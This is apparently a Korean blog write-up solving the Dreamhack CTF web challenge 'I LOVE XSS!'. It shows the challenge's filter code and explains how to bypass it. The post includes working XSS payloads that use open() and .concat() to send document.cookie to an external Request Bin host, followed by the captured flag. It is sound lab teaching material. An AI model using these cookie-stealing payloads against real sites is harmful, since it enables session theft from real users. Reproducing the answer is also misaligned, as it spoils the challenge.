---
title: "[Dreamhack] I LOVE XSS! 해설"
author: jyp
date: 2026-06-09 12:00:02 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 특징

> XSS를 사용한 해킹 & 금지 태그 우회

## **난이도**: Lv.2
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── app.py
├── Dockerfile
├── requirements.txt
└── sanitizer.py
```

## 주요 코드 

```python

#app.py

banlist = ["`","'","alert(","fetch(","replace(","[","]","javascript","@","!","%","location","href","window","eval"]


def read_url(url):
    driver = None
    try:
        service = Service(executable_path="/usr/local/bin/chromedriver")
        options = webdriver.ChromeOptions()
        for opt in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(opt)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:5000/")
        driver.add_cookie({'name':'flag','value':FLAG, 'domain':'127.0.0.1'})
        driver.get(url)
        time.sleep(1)
    except Exception as e:
        if driver:
            driver.quit()
        return False
    if driver:
        driver.quit()
    return True

@app.route('/')
def home():
    return "I LOVE XSS!"

@app.route('/test', methods=['GET'])
def test():
    payload = request.args.get('payload')
    if payload is None:
        return "show your payload!"
    
    payload = payload.lower()

    if any(banned in payload for banned in banlist):
        payload = "Nope!"

    input = sanitize_input(payload)

    return f"{input}"

@app.route('/flag')
def report():
    uanswer = request.args.get('answer')
    result = read_url(f'http://127.0.0.1:5000/test?payload={uanswer}')
    message = "Success" if result else "Fail"
    return message
```

```python
# sanitizer.py
import bleach

ALLOWED_TAGS = ['script']   #I only love script tags!
ALLOWED_ATTRIBUTES = {}
ALLOWED_PROTOCOLS = ['http', 'https']

def sanitize_input(user_input: str) -> str:
    return bleach.clean(
        user_input,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
        strip_comments=True
    )
```

이 문제는 [XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/),[XSS_Filtering_Bypass](https://1221jyp.com/posts/Dreamhack_XSS-Filtering-Bypass/)문제와 매우 유사한 문제이고, [XSS_Filtering_Bypass](https://1221jyp.com/posts/Dreamhack_XSS-Filtering-Bypass/) 문제보다 더 다양한 필터가 존재하는것을 확인할 수 있다.

또한 이전 문제와는 달리 메모가 존재하지 않아, 다른 방식을 활용해 플래그를 탈취해야 한다.

그리고 `bleach` 라이브러리를 사용하여 `sanitize_input()`이라는 함수를 만들고 
`input = sanitize_input(payload)`이 작성되어 XSS 스크립트를 오로지 `<script>`태그만을 사용하여 문제를 풀도록 되어있다.

`XSS`가 무엇인지 궁금하다면 [XSS-2](https://1221jyp.com/posts/Dreamhack_Xss-2/)문제를 먼저 확인하자.

# 풀이

## 필터에 유의하여 페이로드 작성하기
```python
banlist = ["`","'","alert(","fetch(","replace(","[","]","javascript","@","!","%","location","href","window","eval"]

def test():
    payload = request.args.get('payload')
    if payload is None:
        return "show your payload!"
    
    payload = payload.lower()

    if any(banned in payload for banned in banlist):
        payload = "Nope!"

    input = sanitize_input(payload)

    return f"{input}"
```
이 문제는 `payload.lower()`함수로 인해 입력한 페이로드를 모두 소문자화하기 때문에, 페이로드를 대문자로 작성하여 필터링을 우회하는 방법을 사용하기는 어렵다. 

또한 `memo`와 같이 내부 서버에서 웹사이트에서 데이터를 수정할 수 있는 명령어가 없기 때문에, 외부 서버를 활용하여 문제를 풀어주어야 한다.


## 드림핵 툴 Request Bin 활용하기

`드림핵`의 `Request Bin` 툴을 사용하면, 드림핵 툴에서 임의로 웹 주소를 하나 만들어주게 된다.
이때, 해당 주소에 요청을 보내게 되면, `드림핵`의 `Request Bin `도구에서 어떤 요청이 왔었는지 조회할 수 있게 도와준다.
따라서 우리는 `Request Bin`도구를 활용하여 해킹하고자 하는 서버의 어드민이 '플래그와 함께' 이 주소로 요청을 보내도록 만들어주어야 한다.


## 페이로드


```
드림핵 서버 주소:포트/flag?answer=<script>open("http://ogwvzgn.request.dreamhack.games/?c=" + document.cookie)</script>
```

`open()`함수는 `window.open()` 을 생략한 함수로, 원래는 파라미터 속 주소에 대한 창을 새로 띄우는 함수이지만, 창을 띄우는 동시에 `GET`요청을 보낸다는 특징을 이용해 필터에 의해 사용하지 못하는`fetch()`함수의 대체재로 사용한다.


## 문제 발생

이때, 페이로드 속에 작성되어있는 기호 `+` 에서 문제가 발생하였다.
`HTML`의 `application/x-www-form-urlencoded` 인코딩 방식에 의해서 나의 브라우저가 `+` 기호를 공백 취급하면서 GET요청을 보내게 된다.

이 문제를 해결하기 위해 `+`라는 기호를 사용하는 대신 `.concat()`이라는 함수를 사용하여 `+` 기호의 역할을 대신해주어야 한다.

## 수정된 페이로드
```
드림핵 서버 주소:포트/flag?answer=<script>open("http://ogwvzgn.request.dreamhack.games/?c=".concat(document.cookie))</script>
```

## 정답 확인

드립핵의 `Request Bin` 도구로 돌아와 요청을 받은 기록을 확인하면

```
Client IP
000.000.000.000
Method
GET
Path
/
Query String
c=flag=4TH3N3{You_love_xss_too_dont_you?}
```
위와 같이 플래그와 함께 `GET`요청이 날아온 것을 확인할 수 있다.

# 정답

4TH3N3{You_love_xss_too_dont_you?}

